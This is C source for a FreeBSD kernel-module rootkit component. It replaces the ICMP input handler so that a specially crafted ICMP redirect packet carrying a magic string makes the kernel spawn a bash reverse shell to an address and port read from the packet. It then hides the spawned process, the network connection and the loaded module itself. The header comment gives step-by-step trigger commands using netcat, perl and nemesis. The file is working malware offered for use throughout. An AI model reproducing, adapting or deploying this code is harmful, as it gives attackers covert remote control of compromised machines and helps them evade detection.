#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/sysproto.h>
#include <sys/kthread.h>
#include <sys/unistd.h>
#include <sys/sysent.h>
#include <sys/sched.h>
#include <sys/types.h>
#include <sys/malloc.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/syscallsubr.h>
#include <sys/imgact.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_map.h>
#include "magick.h"
#include "shadow_sysent.h"
#include "deepbg.h"
#include "whisper.h"
#include "kld_hiding.h"

/*
 * A backdoor icmp_input hook that is triggered whenever an ICMP packet is
 * received that:
 *
 *    1) Is of type ICMP_REDIRECT
 *    2) Has code ICMP_REDIRECT_TOSHOST
 *    3) Has the magic string at the beginning of it's data buffer
 *
 * Once these conditions are met, a 32-bit internet address and 16-bit port
 * number are read from the packet's data buffer.
 *
 * A reverse shell connection using bash is then attempted to the given address
 * and port number.
 *
 * netcat (nc) can be used to listen for the inbound connection.
 *
 * The included trigger program can be used to activate the backdoor with an
 * order 66 packet.
 *
 * Alternatively, perl can be used to craft the packet's data buffer and
 * nemesis (https://github.com/libnet/nemesis) can be used to craft the ICMP
 * packet with the necessary type, code, and data payload
 *
 * Example:
 *
 * For a reverse shell to 192.168.1.123
 * From 192.168.1.250: nc -lnvp 5555
 * From anywhere: # echo "z4xX0n" > /tmp/payload
 *                # perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
 *                # nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
 */

#define KLD_NAME T_NAME"_order_66"
#define KLD_FILE_NAME T_NAME"_order_66.ko"
#define BASH "/usr/local/bin/bash"
#define BASH_OPT "-c"
#define BASH_COMMAND_STR "/bin/sh -i>& /dev/tcp/"
#define FULL_BASH_COMMAND_STR BASH_COMMAND_STR"255.255.255.255/65535 0>&1"
#define ARG2LEN 48

extern struct protosw inetsw[];

char ** order_66_args = NULL;

unsigned int w_fport;

struct sx stk_xfer_lock;

struct order_66_params {
   struct proc * stk_order_66_proc;
   char * stk_order_66_args[3][ARG2LEN];
   unsigned int fport;
};

static void start_order_66(void *data) {
#ifdef DEBUG
   printf("[-] start_order_66 process started\n");
#endif
   struct order_66_params * params = (struct order_66_params *)data;
   vm_offset_t addr;
   struct execve_args args;
   int error;
   size_t length;
   char *ucp, **uap, *arg0, *arg1, *arg2;
   struct thread *td;
   struct proc *p;

   td = curthread;
   p = td->td_proc;

   /*
    * Need just enough stack to hold the faked-up "execve()" arguments.
    */
   addr = p->p_sysent->sv_usrstack - PAGE_SIZE;
   if (vm_map_find(&p->p_vmspace->vm_map, NULL, 0, &addr, PAGE_SIZE, 0,
      VMFS_NO_SPACE, VM_PROT_ALL, VM_PROT_ALL, 0) != 0) {
#ifdef DEBUG
      printf("[x] init: couldn't allocate argument space");
#endif
      return;
   }

   p->p_vmspace->vm_maxsaddr = (caddr_t)addr;
   p->p_vmspace->vm_ssize = 1;

   ucp = (char *)p->p_sysent->sv_usrstack;

   length = strlen((char *)params->stk_order_66_args[2]) + 1;
   ucp -= length;
   copyout((char *)params->stk_order_66_args[2], ucp, length);
   arg2 = ucp;

   length = strlen((char *)params->stk_order_66_args[1]) + 1;
   ucp -= length;
   copyout((char *)params->stk_order_66_args[1], ucp, length);
   arg1 = ucp;

   length = strlen((char *)params->stk_order_66_args[0]) + 1;
   ucp -= length;
   copyout((char *)params->stk_order_66_args[0], ucp, length);
   arg0 = ucp;

   /*
    * Move out the arg pointers.
    */

   uap = (char **)rounddown2((intptr_t)ucp, sizeof(intptr_t));
   (void)suword((caddr_t)--uap, (long)0);   /* terminator */
   (void)suword((caddr_t)--uap, (long)(intptr_t)arg2);
   (void)suword((caddr_t)--uap, (long)(intptr_t)arg1);
   (void)suword((caddr_t)--uap, (long)(intptr_t)arg0);

   /*
    * Point at the arguments.
    */
   args.fname = arg0;
   args.argv = uap;
   args.envv = NULL;

   /*
    * Now try to exec the program.  If can't for any reason
    * other than it doesn't exist, complain.
    *
    * Otherwise, return via fork_trampoline() all the way
    * to user mode as init!
    */
#ifdef DEBUG
   printf("[-] calling sys_execve\n");
#endif
   if ((error = sys_execve(td, &args)) == EJUSTRETURN) {
#ifdef DEBUG
      printf("[-] EJUSTRETURN returned from sys_execve\n");
#endif
      return;
   }

   if (error != ENOENT) {
#ifdef DEBUG
      printf("[x] exec %s: error %d\n", (char *)params->stk_order_66_args[0],
         error);
#endif
   }

#ifdef DEBUG
   printf("[x] order_66 failed\n");
#endif
}

static void create_order_66(void *data) {
#ifdef DEBUG
   printf("[-] create_order_66 called\n");
#endif
   struct order_66_params * params = (struct order_66_params *)data;
   struct fork_req fr;
   struct ucred *newcred, *oldcred;
   struct thread *td;
   int error;

   bzero(&fr, sizeof(fr));
   fr.fr_flags = RFFDG | RFPROC | RFSTOPPED;
   fr.fr_procp = &params->stk_order_66_proc;
   error = fork1(curthread, &fr);
   if (error) {
#ifdef DEBUG
      printf("[x] cannot fork order_66: %d\n", error);
#endif
      return;
   }

   /* divorce order_66's credentials from the kernel's */
   newcred = crget();
   sx_xlock(&proctree_lock);
   PROC_LOCK(params->stk_order_66_proc);
   oldcred = params->stk_order_66_proc->p_ucred;
   crcopy(newcred, oldcred);
   proc_set_cred(params->stk_order_66_proc, newcred);
   td = FIRST_THREAD_IN_PROC(params->stk_order_66_proc);
   crcowfree(td);
   td->td_realucred = crcowget(params->stk_order_66_proc->p_ucred);
   td->td_ucred = td->td_realucred;
   PROC_UNLOCK(params->stk_order_66_proc);
   sx_xunlock(&proctree_lock);
   crfree(oldcred);

   cpu_fork_kthread_handler(FIRST_THREAD_IN_PROC(params->stk_order_66_proc),
      start_order_66, params);
}

static void kick_order_66(void *data) {
   struct order_66_params * params = (struct order_66_params *)data;
   struct thread *td;

   td = FIRST_THREAD_IN_PROC(params->stk_order_66_proc);
   thread_lock(td);
   TD_SET_CAN_RUN(td);
   sched_add(td, SRQ_BORING);
}

static void order_66() {
#ifdef DEBUG
   printf("[-] order_66 thread created\n");
#endif
   // Structure for holding parameters on the stack
   struct order_66_params params;

   sx_xlock(&stk_xfer_lock);
   // Copy order_66_args to stack
   bzero(&params.stk_order_66_args[0][0], ARG2LEN);
   strcpy((char *)params.stk_order_66_args[0], (char *)order_66_args[0]);
   bzero(&params.stk_order_66_args[1][0], ARG2LEN);
   strcpy((char *)params.stk_order_66_args[1], (char *)order_66_args[1]);
   bzero(&params.stk_order_66_args[2][0], ARG2LEN);
   strcpy((char *)params.stk_order_66_args[2], (char *)order_66_args[2]);

   // Copy port to stack
   params.fport = w_fport;

   // Free memory since args were copied to the stack
   free(order_66_args[0], M_TEMP);
   free(order_66_args[1], M_TEMP);
   free(order_66_args[2], M_TEMP);
   free(order_66_args, M_TEMP);
   order_66_args = NULL;
   sx_xunlock(&stk_xfer_lock);

   create_order_66(&params);
   kick_order_66(&params);

   int status;
   int error;
   sy_call_t * deepbg = shadow_sysent[DEEPBG_INDEX].new_sy_call;
   sy_call_t * whisper = shadow_sysent[WHISPER_INDEX].new_sy_call;
   struct whisper_args wa;
   struct deepbg_args da;
   da.p_pid = params.stk_order_66_proc->p_pid;
   pause("zzz", 100);

   if (deepbg != NULL) {
#ifdef DEBUG
      printf("[-] Hiding pid %u\n", da.p_pid);
#endif

      if ((error = deepbg(curthread, &da)) != 0) {
#ifdef DEBUG
         printf("[x] deepbg %u failed\n", da.p_pid);
#endif
      }
   }

   // Hide connection
   if (whisper != NULL) {
      wa.lport = 0;
      wa.fport = params.fport;
#ifdef DEBUG
      printf("[-] Hiding connection with foreign port %u\n", wa.fport);
#endif

      if ((error = whisper(curthread, &wa)) != 0) {
#ifdef DEBUG
         printf("[x] whisper %u failed\n", wa.fport);
#endif
      }
   }

   // Wait for the process to exit before exiting the kernel thread
   kern_wait(curthread, params.stk_order_66_proc->p_pid, &status, 0, NULL);

#ifdef DEBUG
   printf("[-] order_66 thread exiting\n");
#endif
   kthread_exit();
}

pr_input_t icmp_input_order_66;
/* icmp_input hook. */
int icmp_input_order_66(struct mbuf **m, int *off, int proto) {
   struct icmp *icp;
   struct mbuf *mbuf = *m;
   int hlen = *off;
   // Get the IP header
   struct ip *ip = mtod(mbuf, struct ip *);
   // Get the length of the ICMP portion of the packet
   int icmplen = ntohs(ip->ip_len) - *off;
   *m = NULL;
   int i;

   // Verify that it is at least the minimum length
   if (icmplen < ICMP_MINLEN) {
      m_freem(mbuf);
      return (IPPROTO_DONE);
   }

   i = hlen + min(icmplen, ICMP_ADVLENMIN);

   if (mbuf->m_len < i && (mbuf = m_pullup(mbuf, i)) == NULL)  {
      return (IPPROTO_DONE);
   }

   ip = mtod(mbuf, struct ip *);
   /* Locate the ICMP message within m. */
   mbuf->m_len -= hlen;
   mbuf->m_data += hlen;
   /* Extract the ICMP message. */
   icp = mtod(mbuf, struct icmp *);
   /* Restore m. */
   mbuf->m_len += hlen;
   mbuf->m_data -= hlen;
   /* Is this the ICMP message we are looking for? */
   if (icp->icmp_type == ICMP_REDIRECT &&
      icp->icmp_code == ICMP_REDIRECT_TOSHOST &&
      strncmp(icp->icmp_data, T_NAME, strlen(T_NAME)) == 0) {
#ifdef DEBUG
      printf("[-] found an order_66 packet\n");
#endif
      char * ptr = icp->icmp_data;
      ptr = icp->icmp_data;
      ptr+=strlen(T_NAME)+1;
      struct in_addr in;
      in.s_addr = ntohl(*((uint32_t *)ptr));
      ptr+=(sizeof(uint32_t));
      uint16_t fport = ntohs(*((uint16_t *)ptr));

      sx_xlock(&stk_xfer_lock);
      w_fport = fport;

      order_66_args = malloc(3*sizeof(char *), M_TEMP, M_NOWAIT);
      order_66_args[0] = malloc(strlen(BASH)+1, M_TEMP, M_NOWAIT);
      order_66_args[1] = malloc(strlen(BASH_OPT)+1, M_TEMP, M_NOWAIT);
      order_66_args[2] = malloc(strlen(FULL_BASH_COMMAND_STR)+1, M_TEMP, M_NOWAIT);

      strcpy(order_66_args[0], BASH);
      strcpy(order_66_args[1], BASH_OPT);
      strcpy(order_66_args[2], FULL_BASH_COMMAND_STR);
      ptr = order_66_args[2];
      bzero(ptr, ARG2LEN);

      strcpy(ptr, BASH_COMMAND_STR);

      ptr+=strlen(ptr);
      char tmp[16];
      bzero(tmp, 16);
      inet_ntoa_r(in, tmp);
      strcpy(ptr, tmp);
      ptr+=strlen(tmp);
      strcpy(ptr, "/");
      ptr++;
#ifdef DEBUG
      printf("[-] Let's be bad guys.\n");
      printf("[-] destination = %s\n", tmp);
#endif

      bzero(tmp, 16);
      sprintf(tmp, "%u", fport);
      strcpy(ptr, tmp);
      ptr+=strlen(tmp);
      strcpy(ptr, " 0>&1");
#ifdef DEBUG
      printf("[-] port = %u\n", fport);
      printf("[-] %s %s %s\n", order_66_args[0], order_66_args[1],
         order_66_args[2]);
#endif

      sx_xunlock(&stk_xfer_lock);

      struct thread *order_66_thread;

      struct kthread_desc kd = {
         "order_66",
         order_66,
         &order_66_thread
      };

      bool disable_sleeping = false;

      // If the current thread isn't allowed to sleep, enable sleeping and set a
      // flag to undo after starting a new thread.
      if (!THREAD_CAN_SLEEP()) {
         THREAD_SLEEPING_OK();
         disable_sleeping = true;
      }

      kthread_start(&kd);

      // Disable sleeping if the current thread was not allowed to sleep
      if (disable_sleeping) {
         THREAD_NO_SLEEPING();
      }

#ifdef DEBUG
       printf("[-] kthread_start called\n");
#endif
   } else {
#ifdef DEBUG
      printf("[-] normal packet found\n");
#endif
      return icmp_input(&mbuf, off, proto);
   }
   return 0;
}

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif

   int error = 0;
   switch (cmd) {
      case MOD_LOAD:
#ifdef DEBUG
         uprintf("[-] Loading order_66 module\n");
#endif
         sx_init(&stk_xfer_lock, "stk_xfer_lock");
         /* Replace icmp_input with icmp_input_order_66. */
         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_order_66;
         break;
      case MOD_UNLOAD:
#ifdef DEBUG
         uprintf("[-] Unloading order_66 module\n");
#endif
         sx_destroy(&stk_xfer_lock);
         /* Change everything back to normal. */
         inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
         break;
      default:
         error = EOPNOTSUPP;
         break;
   }
   return (error);
}

static moduledata_t icmp_input_order_66_mod = {
   "icmp_input_order_66",      /* module name */
   load,                       /* event handler */
   NULL                        /* extra data */
};

DECLARE_MODULE(icmp_input_order_66, icmp_input_order_66_mod, SI_SUB_DRIVERS,
   SI_ORDER_ANY);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
